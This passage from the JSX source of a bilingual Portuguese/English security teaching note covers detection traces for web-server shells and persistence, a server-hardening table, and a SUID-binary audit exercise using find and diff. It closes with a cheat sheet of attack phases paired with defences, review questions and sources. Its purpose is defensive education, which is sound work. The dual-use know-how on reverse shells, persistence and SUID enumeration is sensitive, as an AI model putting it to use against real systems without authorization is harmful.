            ["Shell / execução", <T pt={<>o processo do servidor web gerando um filho <code>sh</code> ou <code>bash</code>; uma conexão de saída que o servidor nunca fez antes</>} en={<>the web server process spawning a <code>sh</code> or <code>bash</code> child; an outbound connection the server never made before</>} />, <T pt="auditd, EDR, logs de saída do firewall; a regra Sigma do projeto 5 da trilha" en="auditd, EDR, firewall egress logs; the Sigma rule from project 5 of the path" />],
            ["Depois do shell", <T pt={<>um usuário, uma chave em <code>authorized_keys</code> ou uma tarefa do cron novos; um binário SUID que não existia</>} en={<>a new user, a key in <code>authorized_keys</code> or a cron job; a SUID binary that did not exist</>} />, <T pt={<><code>/var/log/auth.log</code>, monitoramento de integridade de arquivos (o Wazuh faz isso), auditd</>} en={<><code>/var/log/auth.log</code>, file integrity monitoring (Wazuh does this), auditd</>} />],
          ]}
        />
        <Callout tone="good" icon="check"><T pt={<>Exercício de purple team: repita cada passo do laboratório desta nota e, depois de cada um, procure o rastro correspondente (o log de acesso do contêiner do DVWA, o <code>docker compose logs</code>, uma captura com o tcpdump lida pelo Suricata). Anote o que apareceu e o que passou em silêncio. A trilha tem o roteiro completo nos projetos 3 (mini SOC) e 5 (regra Sigma).</>} en={<>Purple team exercise: repeat each lab step of this note and, after each one, look for the matching trace (the DVWA container access log, <code>docker compose logs</code>, a tcpdump capture read by Suricata). Note what appeared and what slipped past silently. The path has the full script in projects 3 (mini-SOC) and 5 (Sigma rule).</>} /></Callout>
      </Section>
      <Section id="hardening" title={<T pt="Hardening do servidor: fechar antes de alguém abrir" en="Server hardening: close it before someone opens it" />}>
        <p><T pt={<>Depois de ver como um shell se abre, a defesa mais eficaz é reduzir o que existe para ser explorado <em>antes</em> de qualquer ataque. "Hardening" é esse trabalho de endurecimento: cada item abaixo fecha uma porta que as seções anteriores usaram para entrar ou para persistir.</>} en={<>After seeing how a shell gets opened, the most effective defence is shrinking what there is to exploit <em>before</em> any attack happens. "Hardening" is that toughening work: each item below closes a door the previous sections used to get in or to persist.</>} /></p>
        <Table
          head={[<T pt="Item" en="Item" />, <T pt="Comando / onde configurar" en="Command / where to configure" />, <T pt="Fecha" en="Closes" />]}
          rows={[
            [<T pt="Usuário sem privilégio para o servidor web" en="Unprivileged user for the web server" />, <><code>User www-data</code> no systemd/nginx, nunca <code>root</code></>, <T pt="o alcance de um comando executado através de uma falha na aplicação" en="the reach of a command run through an application flaw" />],
            [<T pt="Patches em dia" en="Patches up to date" />, <><code>sudo apt update &amp;&amp; sudo apt upgrade</code>, automatizado com <code>unattended-upgrades</code></>, <T pt="CVEs conhecidos, a maioria do que scanners automatizados encontram" en="known CVEs, most of what automated scanners find" />],
            [<T pt="Auditoria de binários SUID" en="SUID binary audit" />, <><code>find / -perm -4000 -type f 2&gt;/dev/null</code>, comparado com uma lista conhecida</>, <T pt="escalada de privilégio via um binário SUID extra ou mal configurado" en="privilege escalation via an extra or misconfigured SUID binary" />],
            [<T pt="Permissões de cron e cuidado com scripts graváveis" en="Cron permissions and writable-script care" />, <><code>ls -la /etc/cron.d/ /etc/crontab</code>; nenhum script chamado por root deve ser gravável por outro usuário</>, <T pt="persistência via tarefa agendada" en="persistence via a scheduled task" />],
            [<T pt="Filtragem de saída (egress)" en="Egress filtering" />, <><code>nftables</code>/<code>ufw</code> negando saída por padrão — veja a nota de ataque e defesa em redes</>, <T pt="shells reversos e exfiltração" en="reverse shells and exfiltration" />],
            [<T pt="Monitoramento de integridade de arquivos" en="File integrity monitoring" />, <>Wazuh, <code>auditd</code> com regras em <code>/etc/audit/rules.d/</code></>, <T pt="chaves SSH, usuários e binários adicionados sem você saber" en="SSH keys, users and binaries added without you knowing" />],
            [<T pt="Content-Security-Policy e escape de saída" en="Content-Security-Policy and output escaping" />, <T pt="no framework/middleware — veja a nota de aplicações web seguras" en="in the framework/middleware — see the secure web apps note" />, "XSS"],
          ]}
        />
        <h3><T pt="Exercício: auditar a sua própria VM de laboratório" en="Exercise: audit your own lab VM" /></h3>
        <CodeBlock>
          <span className="tok-c"># rode no host do laboratório (não no contêiner DVWA, que é feito para ter falhas)</span>{"\n"}
          {"find / -perm -4000 -type f 2>/dev/null | sort > suid-antes.txt\n"}
          <span className="tok-c"># depois de qualquer alteração no sistema, repita e compare:</span>{"\n"}
          {"find / -perm -4000 -type f 2>/dev/null | sort > suid-depois.txt\n"}
          {"diff suid-antes.txt suid-depois.txt"}
        </CodeBlock>
        <p><T pt={<><strong>Resultado esperado:</strong> o <code>diff</code> fica vazio numa máquina que você não alterou; qualquer linha que aparecer é um binário SUID novo, exatamente o tipo de mudança que a tabela "depois do shell" da seção anterior descreve como rastro de escalada de privilégio.</>} en={<><strong>Expected result:</strong> the <code>diff</code> is empty on a machine you have not changed; any line that shows up is a new SUID binary, exactly the kind of change the previous section's "after the shell" table describes as a privilege-escalation trace.</>} /></p>
      </Section>
      <Section id="cheat-rt" title={<T pt="Cola e revisão" en="Cheat sheet and review" />}>
        <h3><T pt="Cola: o ciclo e a defesa de cada fase" en="Cheat sheet: the lifecycle and each phase's defence" /></h3>
        <Table
          head={[<T pt="Fase" en="Phase" />, <T pt="Pergunta que o atacante faz" en="Question the attacker asks" />, <T pt="Defesa principal" en="Main defence" />]}
          rows={[
            [<T pt="Recon" en="Recon" />, <T pt="o que existe, publicamente?" en="what exists, publicly?" />, "inventário de ativos, remover metadados, monitorar vazamentos"],
            [<T pt="Engenharia social" en="Social engineering" />, <T pt="quem confia em quem, e por quê?" en="who trusts whom, and why?" />, "MFA resistente a phishing, cultura de verificação, treinamento"],
            [<T pt="Exploração" en="Exploitation" />, <T pt="o que essa entrada faz se eu mudar o formato dela?" en="what does this input do if I change its shape?" />, "consultas parametrizadas, escapar saída, validar no servidor"],
            [<T pt="Shell / execução" en="Shell / execution" />, <T pt="consigo rodar um comando meu aqui?" en="can I run a command of mine here?" />, "menor privilégio, filtragem de saída, EDR"],
            [<T pt="Escalada e persistência" en="Escalation and persistence" />, <T pt="como viro alguém com mais poder, e fico?" en="how do I become someone with more power, and stay?" />, "patches, auditoria de SUID/cron, menor privilégio"],
            [<T pt="Movimento lateral" en="Lateral movement" />, <T pt="que outras máquinas esse host alcança?" en="what other machines can this host reach?" />, "segmentação de rede, firewall interno"],
            [<T pt="Exfiltração" en="Exfiltration" />, <T pt="como tiro dados sem ser notado?" en="how do I get data out unnoticed?" />, "filtragem de saída, DLP, alertas de anomalia"],
          ]}
        />
        <h3><T pt="Perguntas de revisão" en="Review questions" /></h3>
        <Table
          head={[<T pt="Pergunta" en="Question" />, <T pt="Resposta" en="Answer" />]}
          rows={[
            [<T pt="Por que um pentest precisa de um contrato antes de começar?" en="Why does a pentest need a contract before it starts?" />, <T pt="Porque as mesmas técnicas, sem autorização por escrito e escopo definido, são crime em praticamente todo lugar." en="Because the same techniques, without written authorization and a defined scope, are a crime almost everywhere." />],
            [<T pt="Qual a diferença entre recon passivo e ativo?" en="What is the difference between passive and active recon?" />, <T pt="Passivo não toca o alvo (WHOIS, Shodan); ativo manda pacotes para ele (nmap)." en="Passive never touches the target (WHOIS, Shodan); active sends packets to it (nmap)." />],
            [<T pt="Por que o phishing é o vetor inicial mais comum, segundo os relatórios do setor?" en="Why is phishing the most common initial vector, per industry reports?" />, <T pt="Explora confiança humana, que é mais difícil de corrigir com uma atualização do que uma falha de software." en="It exploits human trust, which is harder to patch than a software flaw." />],
            [<T pt="O que uma consulta parametrizada evita, que concatenar texto não evita?" en="What does a parameterised query prevent that concatenating text does not?" />, <T pt="Trata a entrada do usuário sempre como um VALOR, nunca como parte da estrutura do comando SQL." en="It always treats user input as a VALUE, never as part of the SQL command's structure." />],
            [<T pt="Por que um shell reverso costuma passar por firewalls que bloqueiam entrada?" en="Why does a reverse shell usually get past firewalls that block inbound traffic?" />, <T pt="Porque é o ALVO que inicia a conexão de saída, não o atacante que tenta entrar." en="Because the TARGET initiates the outbound connection, not the attacker trying to get in." />],
            [<T pt="O que é movimento lateral?" en="What is lateral movement?" />, <T pt="Usar um host já comprometido como ponte para alcançar outras máquinas da mesma rede." en="Using an already-compromised host as a bridge to reach other machines on the same network." />],
            [<T pt="Cite dois controles que reduzem o risco de engenharia social sem depender só do usuário perceber." en="Name two controls that reduce social-engineering risk without relying solely on the user noticing." />, <T pt="MFA resistente a phishing e SPF/DKIM/DMARC no domínio (entre outros: segmentação, menor privilégio)." en="Phishing-resistant MFA and SPF/DKIM/DMARC on the domain (among others: segmentation, least privilege)." />],
          ]}
        />
      </Section>
      <Sources
        links={[
          { label: "MITRE ATT&CK. The public, industry-standard catalogue of adversary tactics and techniques.", href: "https://attack.mitre.org/" },
          { label: "OWASP Top 10. The most-cited list of web application security risks.", href: "https://owasp.org/www-project-top-ten/" },
          { label: "Dafydd Stuttard and Marcus Pinto. The Web Application Hacker's Handbook, 2nd edition. Wiley, 2011.", href: "https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470" },
          { label: "CIS Benchmarks. Consensus-based Linux and web server hardening guides.", href: "https://www.cisecurity.org/cis-benchmarks" },
          { label: "SigmaHQ. Generic signature format for SIEM systems (the detection side of this note).", href: "https://github.com/SigmaHQ/sigma" },
          { label: "Penetration Testing Execution Standard (PTES).", href: "http://www.pentest-standard.org/" },
          { label: "NIST Special Publication 800-115. Technical Guide to Information Security Testing and Assessment.", href: "https://csrc.nist.gov/pubs/sp/800/115/final" },
          { label: "Damn Vulnerable Web Application (DVWA) project.", href: "https://dvwa.co.uk/" },
          { label: "OWASP Juice Shop project.", href: "https://owasp.org/www-project-juice-shop/" },
          { label: "CompTIA PenTest+ exam objectives.", href: "https://www.comptia.org/certifications/pentest" },
        ]}
      />
    </>
  );
}
